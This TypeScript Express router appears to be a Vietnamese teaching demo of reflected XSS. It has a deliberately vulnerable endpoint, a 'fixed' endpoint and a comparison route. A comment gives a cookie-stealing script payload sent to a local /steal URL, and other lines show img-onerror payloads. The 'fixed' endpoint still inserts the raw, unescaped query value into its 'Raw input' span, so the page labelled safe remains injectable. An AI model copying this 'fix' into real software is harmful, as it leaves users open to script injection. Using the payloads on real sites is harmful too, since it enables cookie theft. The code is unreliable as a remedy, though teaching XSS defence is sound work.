import { Router, Request, Response } from "express";
import he from "he";
export const xssRouter = Router();

xssRouter.get("/reflected-xss", (req: Request, res: Response): void => {
  const msg = req.query.msg; 

  // ❌ LỖI: Chèn thẳng input của user vào HTML response
  // Attacker có thể gửi: ?msg=<script>fetch('http://localhost:4000/steal?cookie='+document.cookie)</script>
  res.send(`
    <!DOCTYPE html>
    <html lang="vi">
    <head>
      <meta charset="UTF-8">
      <title>❌ Reflected XSS - CÓ LỖI</title>
      <style>
        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #ff4444; }
        .warning { background: #2a0000; border: 2px solid #ff4444; padding: 15px; border-radius: 8px; }
        .code { background: #0d0d0d; padding: 10px; border-radius: 4px; margin: 10px 0; }
      </style>
    </head>
    <body>
      <div class="warning">
        <h2>⚠️ TRANG NÀY CÓ LỖI XSS (Demo)</h2>
        <p>Input của user được chèn thẳng vào HTML:</p>
        <div class="code">res.send("&lt;h1&gt;" + req.query.msg + "&lt;/h1&gt;")</div>
      </div>
      <h1>${msg}</h1>
      <p>Thử payload: <code>?msg=&lt;img src=x onerror="alert('XSS!')"&gt;</code></p>
    </body>
    </html>
  `);
});

xssRouter.get("/reflected-xss-fixed", (req: Request, res: Response): void => {
  const rawMsg = req.query.msg;

  // ✅ FIX 1: Kiểm tra type và convert sang string
  const msgStr = typeof rawMsg === "string" ? rawMsg : String(rawMsg ?? "");

  // ✅ FIX 2: Escape HTML entities bằng thư viện `he`
  // < → &lt;  |  > → &gt;  |  " → &quot;  |  & → &amp;
  const safeMsg = he.encode(msgStr);

  res.send(`
    <!DOCTYPE html>
    <html lang="vi">
    <head>
      <meta charset="UTF-8">
      <title>✅ Reflected XSS - ĐÃ FIX</title>
      <style>
        body { font-family: monospace; padding: 20px; background: #0a1a0a; color: #44ff44; }
        .success { background: #001a00; border: 2px solid #44ff44; padding: 15px; border-radius: 8px; }
        .code { background: #0d0d0d; padding: 10px; border-radius: 4px; margin: 10px 0; color: #aaffaa; }
        .safe-value { color: #ffffff; background: #1a1a1a; padding: 5px 10px; border-radius: 4px; }
      </style>
    </head>
    <body>
      <div class="success">
        <h2>✅ TRANG NÀY ĐÃ ĐƯỢC FIX (Demo)</h2>
        <p>Input được escape trước khi render:</p>
        <div class="code">const safeMsg = he.encode(req.query.msg)</div>
        <p>Raw input: <span class="safe-value">${rawMsg}</span></p>
        <p>Sau khi escape: <span class="safe-value">${safeMsg}</span></p>
      </div>
      <h1>${safeMsg}</h1>
      <p>Script/HTML tags đã bị vô hiệu hóa ✅</p>
    </body>
    </html>
  `);
});

// =============================================================================
// 📊 So sánh hai endpoint
// URL: GET /demo/compare
// =============================================================================
xssRouter.get("/compare", (_req: Request, res: Response): void => {
  res.json({
    vulnerable: {
      url: "/demo/reflected-xss?msg=YOUR_PAYLOAD",
      description: "❌ Chèn thẳng req.query.msg vào HTML — có lỗi XSS",
      example: "/demo/reflected-xss?msg=<img src=x onerror=alert(1)>",
      code: `res.send("<h1>" + req.query.msg + "</h1>")`,
    },
    fixed: {
      url: "/demo/reflected-xss-fixed?msg=YOUR_PAYLOAD",
      description: "✅ Escape HTML bằng 'he' library — an toàn",
      example: "/demo/reflected-xss-fixed?msg=<img src=x onerror=alert(1)>",
      code: `const safeMsg = he.encode(req.query.msg);\nres.send("<h1>" + safeMsg + "</h1>")`,
    },
    cookieSecurity: {
      httpOnly: "✅ true — JavaScript không đọc được cookie",
      secure: "✅ true (production) — Chỉ gửi qua HTTPS",
      sameSite: "✅ strict — Chống CSRF",
    },
  });
});